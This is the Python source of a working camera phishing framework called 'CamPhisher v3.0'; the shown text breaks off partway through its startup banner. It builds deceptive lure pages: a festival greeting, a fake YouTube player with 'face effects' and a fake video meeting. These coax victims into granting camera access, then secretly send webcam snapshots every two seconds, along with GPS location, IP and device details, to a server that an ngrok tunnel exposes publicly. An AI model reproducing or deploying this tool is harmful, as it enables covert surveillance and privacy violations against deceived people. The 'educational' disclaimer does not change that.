#!/usr/bin/env python3
"""
Advanced CamPhisher Tool v3.0 - FIXED VERSION
Professional Grade Camera Phishing Framework
For Educational and Security Testing Purposes Only
"""

import os
import sys
import time
import json
import base64
import socket
import random
import string
import threading
import subprocess
import http.server
import socketserver
import platform
import shutil
import signal
from datetime import datetime
from urllib.parse import parse_qs, urlparse, quote
from pathlib import Path
import re

# ==================== Configuration ====================
VERSION = "3.0"
PORT = random.randint(4000, 9000)  # Random port for better security
LOCALHOST = "127.0.0.1"
TEMP_DIR = "temp_data"
OUTPUT_DIR = "captured_data"

# Template configurations
TEMPLATES = {
    '1': {
        'name': '🎉 Festival Greeting Card',
        'desc': 'Interactive festival wishes with camera access',
        'category': 'social'
    },
    '2': {
        'name': '📺 Premium YouTube Player',
        'desc': 'Fake video player requesting camera for "face effects"',
        'category': 'entertainment'
    },
    '3': {
        'name': '💼 Professional Meeting',
        'desc': 'Fake business meeting platform',
        'category': 'business'
    }
}

# ==================== Global Variables ====================
captured_data = {
    'sessions': [],
    'ips': [],
    'locations': [],
    'photos': [],
    'user_agents': [],
    'device_info': []
}
stop_event = threading.Event()
current_template = None
template_config = {}
httpd = None
tunnel_process = None

# ==================== HTML Templates ====================

def get_festival_template(festival_name, custom_message):
    """Generate festival template"""
    return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{festival_name} Wishes</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            max-width: 600px;
            width: 100%;
        }}
        
        .card {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.6s ease;
        }}
        
        @keyframes slideUp {{
            from {{
                opacity: 0;
                transform: translateY(30px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        
        h1 {{
            font-size: 2.5em;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        .greeting-box {{
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
            text-align: center;
            font-size: 1.2em;
            line-height: 1.8;
            color: #444;
        }}
        
        .input-group {{
            margin: 25px 0;
        }}
        
        .input-group label {{
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }}
        
        .input-group input {{
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1em;
            transition: all 0.3s;
        }}
        
        .input-group input:focus {{
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }}
        
        .button {{
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 12px;
            font-size: 1.1em;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        
        .button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }}
        
        .share-buttons {{
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }}
        
        .share-btn {{
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: opacity 0.3s;
        }}
        
        .share-btn:hover {{
            opacity: 0.9;
        }}
        
        .whatsapp {{ background: #25D366; }}
        .facebook {{ background: #1877F2; }}
        
        .loader {{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.9);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }}
        
        .loader.active {{
            display: flex;
        }}
        
        .spinner {{
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>✨ {festival_name} ✨</h1>
            
            <div class="greeting-box" id="greeting">
                🎊 Wishing you and your family a very Happy {festival_name}!<br>
                May this occasion bring joy and prosperity to your life.
            </div>
            
            <div class="input-group">
                <label>Your Name</label>
                <input type="text" id="userName" placeholder="Enter your name" onkeyup="updateGreeting()">
            </div>
            
            <button class="button" onclick="prepareVideoMessage()">
                🎥 Send Video Greeting
            </button>
            
            <div class="share-buttons">
                <button class="share-btn whatsapp" onclick="shareVia('whatsapp')">
                    📱 WhatsApp
                </button>
                <button class="share-btn facebook" onclick="shareVia('facebook')">
                    📘 Facebook
                </button>
            </div>
        </div>
    </div>
    
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p style="margin-top: 20px; color: #333;">Preparing video message...</p>
        <p style="font-size: 0.9em; color: #666;" id="loaderStatus">Requesting camera access</p>
    </div>
    
    <!-- Hidden video elements for capture -->
    <div style="display: none;">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader');
        const loaderStatus = document.getElementById('loaderStatus');
        let captureInterval = null;
        let stream = null;
        
        async function prepareVideoMessage() {{
            loader.classList.add('active');
            loaderStatus.innerText = 'Requesting camera access...';
            
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: true,
                    audio: false
                }});
                
                video.srcObject = stream;
                loaderStatus.innerText = 'Camera access granted';
                
                await video.play();
                
                setTimeout(() => {{
                    startCapture();
                }}, 2000);
                
            }} catch (error) {{
                loaderStatus.innerText = 'Camera access needed for video message';
                setTimeout(() => {{
                    loader.classList.remove('active');
                    alert('Please allow camera access to send video greeting');
                }}, 3000);
            }}
        }}
        
        function startCapture() {{
            loaderStatus.innerText = 'Recording video message...';
            
            captureInterval = setInterval(() => {{
                if (video.readyState === video.HAVE_ENOUGH_DATA) {{
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    fetch('/api/photo', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            image: imageData,
                            template: 'festival',
                            name: document.getElementById('userName').value || 'Anonymous',
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }}
            }}, 2000);
            
            setTimeout(() => {{
                loader.classList.remove('active');
                if (captureInterval) {{
                    clearInterval(captureInterval);
                }}
                if (stream) {{
                    stream.getTracks().forEach(track => track.stop());
                }}
                alert('Video message created successfully!');
            }}, 5000);
        }}
        
        function updateGreeting() {{
            const name = document.getElementById('userName').value;
            if (name) {{
                document.getElementById('greeting').innerHTML = 
                    `🎊 Dear ${{name}},<br>` +
                    `Wishing you and your family a very Happy {festival_name}!<br>` +
                    `May this occasion bring joy and prosperity to your life.`;
            }}
        }}
        
        function shareVia(platform) {{
            const url = encodeURIComponent(window.location.href);
            const text = encodeURIComponent(`Send me a video greeting for {festival_name}! 🎉`);
            
            let shareUrl = '';
            if(platform === 'whatsapp') {{
                shareUrl = `https://wa.me/?text=${{text}}%20${{url}}`;
            }} else if(platform === 'facebook') {{
                shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${{url}}`;
            }}
            
            window.open(shareUrl, '_blank');
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }},
                (error) => console.log('Location unavailable')
            );
        }}
        
        // Get device info
        fetch('/api/device', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: new Date().toISOString()
            }})
        }});
    </script>
</body>
</html>"""

def get_youtube_template(video_id):
    """Generate YouTube template"""
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>YouTube Live Stream</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: #0f0f0f;
            font-family: 'Roboto', sans-serif;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .video-player {{
            position: relative;
            width: 100%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            aspect-ratio: 16/9;
        }}
        
        .video-placeholder {{
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        
        .play-button {{
            width: 80px;
            height: 80px;
            background: rgba(255,0,0,0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transition: all 0.3s;
        }}
        
        .play-button:hover {{
            transform: translate(-50%, -50%) scale(1.1);
            background: #ff0000;
        }}
        
        .play-button i {{
            color: white;
            font-size: 40px;
        }}
        
        .face-effects-panel {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(30,30,30,0.95);
            border-radius: 12px;
            padding: 20px;
            color: white;
            width: 250px;
            backdrop-filter: blur(10px);
            z-index: 1000;
        }}
        
        .effect-grid {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 15px 0;
        }}
        
        .effect-item {{
            background: #333;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .effect-item:hover {{
            background: #ff0000;
        }}
        
        .loading {{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }}
        
        .loading.active {{
            display: flex;
        }}
        
        .spinner {{
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="video-player">
            <div class="video-placeholder">
                <img src="https://img.youtube.com/vi/{video_id}/hqdefault.jpg" style="width:100%; height:100%; object-fit:cover;">
                <div class="play-button" onclick="enableFaceEffects()">
                    ▶
                </div>
            </div>
        </div>
    </div>
    
    <div class="face-effects-panel" id="effectsPanel" style="display:none;">
        <h3 style="margin-bottom:10px;">🎭 Face Effects</h3>
        <div class="effect-grid">
            <div class="effect-item" onclick="applyEffect('funny')">😜 Funny</div>
            <div class="effect-item" onclick="applyEffect('glasses')">👓 Glasses</div>
            <div class="effect-item" onclick="applyEffect('hat')">🎩 Hat</div>
            <div class="effect-item" onclick="applyEffect('blur')">🌀 Blur</div>
        </div>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>Initializing face effects...</p>
        <p id="loadingStatus">Requesting camera access</p>
    </div>
    
    <div style="display: none;">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');
        const loadingStatus = document.getElementById('loadingStatus');
        const effectsPanel = document.getElementById('effectsPanel');
        let stream = null;
        let captureInterval = null;
        
        async function enableFaceEffects() {{
            loading.classList.add('active');
            loadingStatus.innerText = 'Requesting camera access...';
            
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: true,
                    audio: false
                }});
                
                video.srcObject = stream;
                loadingStatus.innerText = 'Camera access granted';
                
                await video.play();
                
                setTimeout(() => {{
                    loading.classList.remove('active');
                    effectsPanel.style.display = 'block';
                    startCapture();
                }}, 2000);
                
            }} catch (error) {{
                loadingStatus.innerText = 'Camera access needed for effects';
                setTimeout(() => {{
                    loading.classList.remove('active');
                    alert('Please allow camera access to use face effects');
                }}, 2000);
            }}
        }}
        
        function startCapture() {{
            captureInterval = setInterval(() => {{
                if (video.readyState === video.HAVE_ENOUGH_DATA) {{
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    fetch('/api/photo', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            image: imageData,
                            template: 'youtube',
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }}
            }}, 2000);
        }}
        
        function applyEffect(effect) {{
            alert(`Effect ${{effect}} applied!`);
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }},
                (error) => console.log('Location unavailable')
            );
        }}
    </script>
</body>
</html>"""

def get_meeting_template():
    """Generate meeting template"""
    return """<!DOCTYPE html>
<html>
<head>
    <title>Business Meeting</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: white;
        }
        
        .meeting-container {
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: #2d2d2d;
            padding: 15px 30px;
            border-bottom: 1px solid #444;
        }
        
        .video-grid {
            flex: 1;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            padding: 20px;
        }
        
        .video-box {
            background: #2d2d2d;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
            min-height: 200px;
        }
        
        .video-box.local {
            border: 2px solid #4CAF50;
        }
        
        .participant-info {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        .controls {
            background: #333;
            padding: 15px 30px;
            display: flex;
            justify-content: center;
            gap: 30px;
            border-top: 1px solid #444;
        }
        
        .control-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #ddd;
            cursor: pointer;
            transition: color 0.3s;
        }
        
        .control-btn:hover {
            color: #4CAF50;
        }
        
        .control-btn.danger:hover {
            color: #ff4444;
        }
        
        .join-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #2d2d2d;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            z-index: 2000;
        }
        
        .join-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            font-size: 1.2em;
            cursor: pointer;
            margin: 20px 0;
        }
        
        .join-btn:hover {
            background: #45a049;
        }
    </style>
</head>
<body>
    <div class="meeting-container">
        <div class="header">
            🔒 Secure Meeting • 3 participants
        </div>
        
        <div class="video-grid">
            <div class="video-box local" id="localVideo">
                <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    Your video will appear here
                </div>
                <div class="participant-info">You (Host)</div>
            </div>
            <div class="video-box">
                <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    Participant 1
                </div>
                <div class="participant-info">John Doe</div>
            </div>
            <div class="video-box">
                <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    Participant 2
                </div>
                <div class="participant-info">Jane Smith</div>
            </div>
            <div class="video-box">
                <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    Participant 3
                </div>
                <div class="participant-info">Mike Johnson</div>
            </div>
        </div>
        
        <div class="controls">
            <div class="control-btn" onclick="toggleMute()">
                <span>🎤</span>
                <span>Mute</span>
            </div>
            <div class="control-btn" onclick="toggleVideo()">
                <span>📹</span>
                <span>Stop Video</span>
            </div>
            <div class="control-btn" onclick="shareScreen()">
                <span>📺</span>
                <span>Share</span>
            </div>
            <div class="control-btn danger" onclick="leaveMeeting()">
                <span>📞</span>
                <span>Leave</span>
            </div>
        </div>
    </div>
    
    <div class="join-panel" id="joinPanel">
        <h2>Join Meeting</h2>
        <p style="margin: 20px 0;">Camera access required to join</p>
        <button class="join-btn" onclick="joinMeeting()">Join Now</button>
    </div>
    
    <div style="display: none;">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const joinPanel = document.getElementById('joinPanel');
        const localVideo = document.getElementById('localVideo');
        let stream = null;
        let captureInterval = null;
        
        async function joinMeeting() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
                
                video.srcObject = stream;
                
                // Show local video
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.autoplay = true;
                videoElement.playsinline = true;
                videoElement.style.width = '100%';
                videoElement.style.height = '100%';
                videoElement.style.objectFit = 'cover';
                localVideo.innerHTML = '';
                localVideo.appendChild(videoElement);
                
                joinPanel.style.display = 'none';
                startCapture();
                
            } catch (error) {
                alert('Camera access required to join meeting');
            }
        }
        
        function startCapture() {
            captureInterval = setInterval(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                
                fetch('/api/photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        template: 'meeting',
                        timestamp: new Date().toISOString()
                    })
                });
            }, 2000);
        }
        
        function toggleMute() { alert('Audio controls would work here'); }
        function toggleVideo() { alert('Video controls would work here'); }
        function shareScreen() { alert('Screen sharing would work here'); }
        function leaveMeeting() { window.location.href = '/'; }
        
        // Get location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        })
                    });
                },
                (error) => console.log('Location unavailable')
            );
        }
    </script>
</body>
</html>"""

def get_loading_template():
    """Generate loading template"""
    return """<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .loader-container {
            text-align: center;
            color: white;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            margin: 30px auto;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 300px;
            height: 10px;
            background: rgba(255,255,255,0.3);
            border-radius: 5px;
            margin: 30px auto;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: white;
            animation: progress 3s ease-in-out forwards;
        }
        
        @keyframes progress {
            to { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <h2>Loading, please wait...</h2>
        <div class="spinner"></div>
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <p id="status">Initializing...</p>
    </div>
    
    <script>
        const messages = [
            'Establishing secure connection...',
            'Loading content...',
            'Almost there...',
            'Redirecting...'
        ];
        
        let index = 0;
        setInterval(() => {
            document.getElementById('status').innerText = messages[index % messages.length];
            index++;
        }, 1000);
        
        // Get location during loading
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        })
                    });
                },
                (error) => console.log('Location unavailable')
            );
        }
        
        // Redirect after loading
        setTimeout(() => {
            window.location.href = '/template';
        }, 4000);
    </script>
</body>
</html>"""

# ==================== HTTP Request Handler ====================

class CamPhishHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler with capture functionality"""
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/':
            self.send_loading()
        elif self.path == '/template':
            self.send_template()
        elif self.path == '/api/status':
            self.send_status()
        else:
            self.send_404()
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        
        if self.path == '/api/location':
            self.handle_location(post_data)
        elif self.path == '/api/photo':
            self.handle_photo(post_data)
        elif self.path == '/api/device':
            self.handle_device(post_data)
        elif self.path == '/api/ip':
            self.handle_ip()
        else:
            self.send_404()
    
    def send_loading(self):
        """Send loading page"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(get_loading_template().encode())
        self.log_ip()
    
    def send_template(self):
        """Send selected template"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        if current_template == '1':
            html = get_festival_template(
                template_config.get('festival', 'Festival'),
                template_config.get('message', '')
            )
        elif current_template == '2':
            html = get_youtube_template(template_config.get('video_id', 'dQw4w9WgXcQ'))
        elif current_template == '3':
            html = get_meeting_template()
        else:
            html = '<h1>Template not found</h1>'
        
        self.wfile.write(html.encode())
    
    def send_status(self):
        """Send capture status"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        status = {
            'visitors': len(captured_data.get('ips', [])),
            'locations': len(captured_data.get('locations', [])),
            'photos': len(captured_data.get('photos', [])),
            'devices': len(captured_data.get('device_info', []))
        }
        
        self.wfile.write(json.dumps(status).encode())
    
    def send_404(self):
        """Send 404 page"""
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b'404 - Not Found')
    
    def handle_location(self, post_data):
        """Handle location data"""
        try:
            data = json.loads(post_data.decode())
            location = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'lat': data.get('lat'),
                'lon': data.get('lon'),
                'accuracy': data.get('acc'),
                'maps_url': f"https://maps.google.com/?q={data.get('lat')},{data.get('lon')}"
            }
            
            captured_data['locations'].append(location)
            self.save_location(location)
            
            print(f"\n\033[92m[+]\033[0m Location: {location['lat']}, {location['lon']}")
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Location error: {e}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def handle_photo(self, post_data):
        """Handle photo data"""
        try:
            data = json.loads(post_data.decode())
            image_data = data.get('image', '')
            
            if image_data and ',' in image_data:
                image_data = image_data.split(',')[1]
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"{OUTPUT_DIR}/photo_{timestamp}.jpg"
                
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                
                captured_data['photos'].append(filename)
                print(f"\n\033[92m[+]\033[0m Photo saved: {filename}")
                
        except Exception as e:
            print(f"\033[91m[!]\033[0m Photo error: {e}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def handle_device(self, post_data):
        """Handle device info"""
        try:
            data = json.loads(post_data.decode())
            device = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                **data
            }
            
            captured_data['device_info'].append(device)
            self.save_device(device)
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Device error: {e}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def handle_ip(self):
        """Handle IP capture"""
        self.log_ip()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_ip(self):
        """Log visitor IP"""
        ip_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', 'Unknown')
        }
        
        captured_data['ips'].append(ip_data)
        self.save_ip(ip_data)
        print(f"\n\033[92m[+]\033[0m Visitor: {ip_data['ip']}")
    
    def save_location(self, data):
        """Save location to file"""
        filename = f"{OUTPUT_DIR}/locations.txt"
        with open(filename, 'a') as f:
            f.write(f"{json.dumps(data)}\n")
    
    def save_device(self, data):
        """Save device info to file"""
        filename = f"{OUTPUT_DIR}/devices.txt"
        with open(filename, 'a') as f:
            f.write(f"{json.dumps(data)}\n")
    
    def save_ip(self, data):
        """Save IP to file"""
        filename = f"{OUTPUT_DIR}/ips.txt"
        with open(filename, 'a') as f:
            f.write(f"{json.dumps(data)}\n")
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

# ==================== Tunnel Manager ====================

class TunnelManager:
    """Manage tunneling services"""
    
    def __init__(self):
        self.process = None
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        required = ['php', 'wget', 'unzip']
        missing = []
        
        for cmd in required:
            try:
                subprocess.run([cmd, '--version'], capture_output=True, check=True)
            except:
                missing.append(cmd)
        
        if missing:
            print(f"\n\033[93m[*]\033[0m Missing: {', '.join(missing)}")
            print("Please install manually:")
            print("sudo apt update && sudo apt install php wget unzip")
            return False
        
        return True
    
    def download_ngrok(self):
        """Download ngrok"""
        print("\n\033[93m[*]\033[0m Downloading ngrok...")
        
        system = platform.system().lower()
        
        if system == 'linux':
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
        elif system == 'darwin':
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
        elif system == 'windows':
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
        else:
            return False
        
        try:
            subprocess.run(['wget', '-q', url, '-O', 'ngrok.zip'], check=True)
            subprocess.run(['unzip', '-q', 'ngrok.zip'], check=True)
            os.remove('ngrok.zip')
            if system != 'windows':
                os.chmod('ngrok', 0o755)
            print("\033[92m[+]\033[0m Ngrok downloaded")
            return True
        except:
            print("\033[91m[!]\033[0m Failed to download ngrok")
            return False
    
    def start_ngrok(self, port):
        """Start ngrok tunnel"""
        if not os.path.exists('ngrok') and not os.path.exists('ngrok.exe'):
            if not self.download_ngrok():
                return None
        
        print("\n\033[93m[*]\033[0m Starting ngrok...")
        
        try:
            ngrok_cmd = './ngrok' if os.path.exists('ngrok') else 'ngrok.exe'
            
            self.process = subprocess.Popen(
                [ngrok_cmd, 'http', str(port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(5)
            
            # Get URL
            import requests
            try:
                response = requests.get('http://localhost:4040/api/tunnels')
                data = response.json()
                url = data['tunnels'][0]['public_url']
                print(f"\033[92m[+]\033[0m Ngrok URL: {url}")
                return url
            except:
                print("\033[91m[!]\033[0m Could not get ngrok URL")
                return None
                
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error: {e}")
            return None
    
    def start_local(self, port):
        """Start local PHP server"""
        print("\n\033[93m[*]\033[0m Starting PHP server...")
        
        try:
            self.process = subprocess.Popen(
                ['php', '-S', f'0.0.0.0:{port}'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(2)
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            
            url = f"http://{ip}:{port}"
            print(f"\033[92m[+]\033[0m Local URL: {url}")
            return url
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error: {e}")
            return None
    
    def stop(self):
        """Stop tunnel"""
        if self.process:
            self.process.terminate()
            self.process = None

# ==================== Main Application ====================

class CamPhishApp:
    """Main application"""
    
    def __init__(self):
        self.tunnel = TunnelManager()
        self.httpd = None
        self.running = True
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C"""
        print("\n\n\033[93m[*]\033[0m Shutting down...")
        self.running = False
    
    def show_banner(self):
        """Display banner"""
        os.system('clear' if os.name != 'nt' else 'cls')
        
        print(f"""
\033[96m    ╔══════════════════════════════════════════════════════════╗
    ║                    \033[92mCAMPHISH v{VERSION}\033[96m                      ║
    ║           \033[93mAdvanced Camera Phishing Framework\033[96m                ║
